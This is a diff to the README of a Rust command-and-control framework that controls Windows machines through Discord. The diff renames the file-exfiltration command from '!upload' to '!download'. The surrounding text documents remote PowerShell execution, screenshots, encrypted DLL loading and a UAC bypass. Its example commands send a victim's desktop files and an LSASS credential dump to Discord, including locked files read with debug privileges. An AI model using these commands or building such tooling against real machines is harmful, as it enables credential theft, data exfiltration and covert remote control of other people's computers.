@@ -19,7 +19,7 @@ FrameworkC2 is a modular Command & Control framework written in Rust, designed t
 ```mermaid
 flowchart TB
     subgraph Operator["Operator (Discord Server)"]
-        Commands["Commands: shell, scr, !loaddll, !upload, !uacbypass, !kill"]
+        Commands["Commands: shell, scr, !loaddll, !download, !uacbypass, !kill"]
     end
 
     subgraph Target["Target Machine (Windows)"]
@@ -97,7 +97,7 @@ FrameworkC2/
 │           ├── shell.rs       # PowerShell execution
 │           ├── screenshot.rs  # Multi-monitor capture
 │           ├── loaddll.rs     # PE loader integration
-│           ├── upload.rs      # File upload to Discord
+│           ├── download.rs    # File download from target to Discord
 │           ├── kill.rs        # Beacon self-termination
 │           └── uacbypass.rs   # UAC bypass via CMSTPLUA
 │
@@ -127,7 +127,7 @@ FrameworkC2/
   - `!shell <command>` - Execute PowerShell
   - `!scr` - Screenshot all monitors
   - `!loaddll` - Load DLL from attachment (XOR encrypted)
-  - `!upload <path>` - Upload file from target to Discord (chunked, handles locked files)
+  - `!download <path>` - Download file from target to Discord (chunked, handles locked files)
   - `!uacbypass [cmd]` - Execute command with elevated privileges
   - `!kill` - Terminate the beacon (unload DLL)
   - `!help` - Show available commands
@@ -592,25 +592,25 @@ xor_key = "41"  # Hex key for loaddll decryption
 | Shell | `!shell <cmd>` | Execute PowerShell command |
 | Screenshot | `!scr` | Capture all monitors to PNG |
 | Load DLL | `!loaddll [name]` | Load XOR-encrypted DLL from attachment |
-| Upload | `!upload <path>` | Upload a file from target to Discord |
+| Download | `!download <path>` | Download a file from target to Discord |
 | UAC Bypass | `!uacbypass [cmd]` | Execute with elevated privileges |
 | Kill | `!kill` | Terminate the beacon (unload DLL) |
 | Help | `!help` | Show available commands |
 
-### Uploading Files
+### Downloading Files
 
-The `!upload` command reads a file from the target machine and sends it as a Discord attachment.
+The `!download` command reads a file from the target machine and sends it as a Discord attachment.
 
 - **Locked files**: Opens with `FILE_SHARE_READ|WRITE|DELETE` flags to read files held by other processes
 - **SeDebugPrivilege**: Automatically enabled before reading (helps with protected files when running elevated)
-- **Chunking**: Files > 7 MB are automatically split into parts (`file.dmp.part1`, `.part2`, etc.) to fit Discord's upload limit
+- **Chunking**: Files > 7 MB are automatically split into parts (`file.dmp.part1`, `.part2`, etc.) to fit Discord's file size limit
 
 ```bash
-# Simple file upload
-!upload C:\Users\victim\Desktop\secrets.txt
+# Simple file download
+!download C:\Users\victim\Desktop\secrets.txt
 
-# Upload a locked dump file (beacon must run elevated)
-!upload C:\temp\lsass.dmp
+# Download a locked dump file (beacon must run elevated)
+!download C:\temp\lsass.dmp
 
 # Reassemble chunked files (PowerShell)
 Get-Content file.dmp.part* -Raw -Encoding Byte | Set-Content file.dmp -Encoding Byte
